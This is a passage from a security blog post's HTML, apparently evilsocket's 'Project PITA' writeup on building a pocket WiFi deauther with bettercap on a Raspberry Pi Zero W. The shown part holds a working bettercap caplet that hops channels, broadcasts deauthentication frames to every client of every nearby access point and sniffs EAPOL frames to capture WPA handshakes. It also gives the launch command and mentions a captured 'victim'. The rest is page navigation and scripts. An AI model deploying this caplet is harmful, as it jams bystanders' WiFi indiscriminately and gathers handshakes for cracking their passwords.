nearby access points </span><br><span class="line"># - deauth every client from each one of them</span><br><span class="line">set ticker.period 5</span><br><span class="line">set ticker.commands clear; wifi.show; wifi.deauth ff:ff:ff:ff:ff:ff</span><br><span class="line"># sniff EAPOL frames ( WPA handshakes ) and save them to a pcap file.</span><br><span class="line">set net.sniff.verbose true</span><br><span class="line">set net.sniff.filter ether proto 0x888e</span><br><span class="line">set net.sniff.output wpa.pcap</span><br><span class="line"></span><br><span class="line"># uncomment to only hop on these channels:</span><br><span class="line"># wifi.recon.channel 1,2,3</span><br><span class="line">wifi.recon on</span><br><span class="line">ticker on</span><br><span class="line">net.sniff on</span><br><span class="line"></span><br><span class="line"># we&#39;ll see lots of probes after each deauth, just skip the noise ...</span><br><span class="line">events.ignore wifi.client.probe</span><br><span class="line"># start fresh</span><br><span class="line">events.clear</span><br><span class="line">clear</span><br></pre></td></tr></table></figure>

<p>To start bettercap with this caplet:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan0 up</span><br><span class="line">bettercap -iface wlan0 -caplet /usr/share/bettercap/caplets/pita.cap</span><br><span class="line"><span class="comment"># enjoy ^_^</span></span><br></pre></td></tr></table></figure>

<p>Just after a few minutes my prototype was able to deauth and capture the handshake of some device:</p>
<p><img src="/images/2018/07/victim.png" alt="victim"></p>
<p>I hope I did not forget about any step, the btnep part specifically was a little bit tricky to setup, let me know in the comments if something doesn‚Äôt work for you and I‚Äôll try to help and fix this writeup, as usual, <strong>enjoy!</strong></p>
<center>
<img src="https://abs.twimg.com/emoji/v2/72x72/1f984.png"/>
</center>

  </div>
  <a target="_blank" rel="noopener" href="https://www.patreon.com/bePatron?u=6065463" data-patreon-widget-type="become-patron-button">Become a Patron!</a><script async src="https://c6.patreon.com/becomePatronButton.bundle.js"></script>
  <br/>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">~/</a></li>
         
          <li><a href="/atom.xml">rss</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-FAQ"><span class="toc-number">1.</span> <span class="toc-text">[0x00] FAQ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Kali-image-and-initial-headless-configuration"><span class="toc-number">2.</span> <span class="toc-text">[0x01] Kali image and initial headless configuration.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Having-fun-with-wlan0-and-bettercap"><span class="toc-number">3.</span> <span class="toc-text">[0x03] Having fun with wlan0 and bettercap</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/&text=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/&title=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/&is_video=false&description=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W&body=Check out this article: https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/&title=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/&title=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/&title=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/&title=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/&name=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W&description=&lt;p&gt;A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my pocket that periodically jumps on all the channels in the WiFi spectrum, collects information about the nearby access points and their connected clients and then sends a deauthentication packet to each one of them, resulting in some sort of WiFi jammer on the 802.11 level. As an interesting ‚Äúside effect‚Äù of this jammer (the initial intent was &lt;em&gt;purely for the lulz&lt;/em&gt;) is that the more it deauths, the higher the changes to also sniff WPA2 handshakes.&lt;/p&gt;
&lt;p&gt;Thanks to the awesome work of the Kali and Nexmon communities in packaging the nexmon drivers and utilities and to the recent changes we released in bettercap, this was very easy to setup and to script and given &lt;a href=&#34;https://twitter.com/evilsocket/status/1021367629901115392&#34;&gt;the interest the tweet had&lt;/a&gt; I thought to share this writeup :)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/2018/07/deauth.png&#34; alt=&#34;deauth&#34;&gt;&lt;/p&gt;
&lt;center&gt;&lt;small&gt;&lt;i&gt;This awesome case has been designed by &lt;a href=&#34;https://twitter.com/elkentaro&#34; target=&#34;_blank&#34;&gt;@elkentaro&lt;/a&gt; and can be found on [his Thingverse page](https://www.thingiverse.com/thing:3018480).&lt;/i&gt;&lt;/small&gt;&lt;/center&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2023 Simone Margaritelli
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">~/</a></li>
         
          <li><a href="/atom.xml">rss</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-22026549-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'evilsocket';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-4da572964da15ce9" async="async"></script>

